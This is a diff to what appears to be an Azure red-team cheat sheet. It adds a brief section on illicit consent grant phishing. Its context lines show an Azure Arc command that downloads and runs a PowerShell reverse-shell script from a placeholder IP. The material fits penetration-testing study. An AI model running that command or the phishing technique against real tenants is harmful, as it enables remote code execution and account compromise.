@@ -24,6 +24,7 @@
 * [Break glass accounts](#Break-glass-accounts)
 * [Azure Container Registry dump](#Azure-Container-Registry-dump)
 * [Azure ARC](#Azure-ARC)
+* [Illicit Consent Grant Phishing](#Illicit-Consent-Grant-Phishing)
 
 ## Privesc enumeration
 ### When on a new machine
@@ -656,3 +657,7 @@ az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-g
 ```
 az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name RemoteCode --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'powershell -c iex(New-Object Net.Webclient).downloadstring(\'http://<IP>/Invoke-PowerShellTcp.ps1\')'}" --location "eastus"
 ```
+
+## Illicit Consent Grant Phishing
+- If app registration is allowed for users [link](https://portal.azure.com/#view/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/~/UserSettings) and you can enumerate AD users/emails you can perform Illicit Consent Grant Phishing with an app from inside the tenant.
+- [Link](../initial-access-attacks.md#Illicit-Consent-Grant-phishing) to the attack from Initial Access Attacks
